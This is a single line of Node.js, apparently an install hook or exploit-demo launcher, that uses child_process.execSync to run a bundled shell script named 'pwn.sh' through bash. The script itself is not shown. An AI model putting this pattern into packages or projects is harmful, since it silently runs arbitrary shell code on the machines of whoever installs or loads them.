require('child_process').execSync('bash ' + require('path').join(__dirname, 'pwn.sh'), {stdio: 'inherit'});
